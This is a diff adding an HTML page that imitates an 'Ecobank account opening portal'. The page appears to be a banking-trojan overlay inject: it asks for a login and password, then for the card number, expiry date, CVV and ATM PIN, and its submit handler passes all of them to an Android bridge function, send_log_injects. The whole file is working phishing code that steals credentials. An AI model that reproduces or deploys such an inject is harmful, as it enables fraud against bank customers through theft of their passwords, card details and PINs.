@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        #form1, #form2 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 14px;
+        }
+
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: auto;
+            position: absolute;
+            z-index: 1;
+            left: 0;
+            top: 50%;
+            line-height: 1em;
+            color: #a3a3a3;
+            transition: all 0.2s ease;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 0.3em;
+            padding: 5px 0;
+            z-index: 99;
+            width: auto;
+            left: 0;
+        }
+
+        .cool-input__input:focus + .cool-input__placeholder {
+            color: #85cc3e
+        }
+
+        .input {
+            border: 0;
+            border-bottom: 1px solid #e4e4e5;
+            margin-top: 15px;
+            padding-left: 0;
+            transition: all 0.2s ease;
+            color: #000;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #85cc3e;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f00 !important
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            background-color: #90d13f;
+            color: #fff;
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#90d13f"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+
+            <header>
+                <p>
+                    <img style="width: 34px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFYAAAA3BAMAAABk0KA7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MTdFMDE2NzI5MjQxMTFFQjg3OUZDNjU4NkM3QjIxQzEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDNCNEREQkE5MjQ1MTFFQjg3OUZDNjU4NkM3QjIxQzEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxN0UwMTY3MDkyNDExMUVCODc5RkM2NTg2QzdCMjFDMSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxN0UwMTY3MTkyNDExMUVCODc5RkM2NTg2QzdCMjFDMSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmKW19gAAAAtUExURQCCuheNwSmWxC+Zxkqmzmy21oDA3KbT5rPa68Dg7tHo8uPx9+v1+vP4+/7+/pZk3BUAAADPSURBVEjHzZY7EoFBEAZHFXKhE0hdiGsol3AER3AEiTNI/yqBDGdg539ltjti466ufczMt/HiK/6OvS42lH2sY0rZS0ScGPvRRhwYW7RxRmxq52y/qd0iNrUzdr9V7cjWtSNb1w4s0A4s0PYs0fYs0XYs0nYs0rYs07Ys0yYLtcmmdrX7uvZNss+ira5lsneCxqQp7A2xcbSs2YM5m7kz9RbmjVXtmJpUtW56SPWm6Xk1S8yMUrPPzFQ1q00GqGwxmaWy0GSsym7zJ/jRH+YNbxv4Y74qLVIAAAAASUVORK5CYII=" alt="">
+                </p>
+                <h4> Ecobank account opening portal </h4>
+                <h6 style="font-weight: 300;"> Please login </h6>
+            </header>
+            <section>
+                <div class="cool-input">
+                    <input type="text" id="login" name="login" class="input cool-input__input" placeholder="" autocomplete="off">
+                <span class="cool-input__placeholder">User name</span>
+            </div>
+            <div class="cool-input">
+                <input type="password" id="password" name="password" class="input cool-input__input" placeholder="" autocomplete="off">
+                <span class="cool-input__placeholder">Password</span>
+            </div>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="nextPage" value="Continue">
+        </footer>
+        </div>
+        <div id="form2" style="display:none;">
+            <header>
+                <p>
+                    <img style="width: 34px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFYAAAA3BAMAAABk0KA7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MTdFMDE2NzI5MjQxMTFFQjg3OUZDNjU4NkM3QjIxQzEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDNCNEREQkE5MjQ1MTFFQjg3OUZDNjU4NkM3QjIxQzEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxN0UwMTY3MDkyNDExMUVCODc5RkM2NTg2QzdCMjFDMSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxN0UwMTY3MTkyNDExMUVCODc5RkM2NTg2QzdCMjFDMSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmKW19gAAAAtUExURQCCuheNwSmWxC+Zxkqmzmy21oDA3KbT5rPa68Dg7tHo8uPx9+v1+vP4+/7+/pZk3BUAAADPSURBVEjHzZY7EoFBEAZHFXKhE0hdiGsol3AER3AEiTNI/yqBDGdg539ltjti466ufczMt/HiK/6OvS42lH2sY0rZS0ScGPvRRhwYW7RxRmxq52y/qd0iNrUzdr9V7cjWtSNb1w4s0A4s0PYs0fYs0XYs0nYs0rYs07Ys0yYLtcmmdrX7uvZNss+ira5lsneCxqQp7A2xcbSs2YM5m7kz9RbmjVXtmJpUtW56SPWm6Xk1S8yMUrPPzFQ1q00GqGwxmaWy0GSsym7zJ/jRH+YNbxv4Y74qLVIAAAAASUVORK5CYII=" alt="">
+                </p>
+                <h4> Ecobank account opening portal </h4>
+                <h6 style="font-weight: 300;"> Please login </h6>
+            </header>
+            <section>
+                <div class="cool-input">
+                    <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Credit Card</span>
+                </div>
+                <div class="cool-input" style="float: left; width: 58%;">
+                    <input type="tel" id="exp" name="exp" onkeyup="check7();check8()" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">Expiration Date</span>
+                </div>
+                <div class="cool-input" style="float: right;width: 40%;">
+                    <input type="password" id="cvv" name="cvv" onkeyup="check8()" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">CVV</span>
+                </div>
+                <div style="clear:both;"></div>
+                <div class="cool-input">
+                    <input type="password" id="pin" name="pin" onkeyup="check6();check8()" class="input cool-input__input" autocomplete="off">
+                    <span class="cool-input__placeholder">ATM PIN</span>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" value="Continue">
+            </footer>
+        </div>
+    </form>
+    <script>
+           $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+        $('#pin').mask('0000')
+
+        
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+            nextPage.onclick = function() {
+            if(login.value.length < 3) {
+                login.classList.add('error');
+            } else {
+                login.classList.remove('error');
+            }
+
+            if(password.value.length < 3) {
+                password.classList.add('error');
+            } else {
+                password.classList.remove('error');
+            }
+
+            if(login.value.length > 3 && password.value.length > 3 ) {
+                spinner.style.display = 'block'
+
+                setTimeout(() => {
+                    form1.style.display = 'none'
+                    spinner.style.display = 'none'
+                    form2.style.display = 'flex'
+                }, 2000);
+            }
+        }
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.pin = pin.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
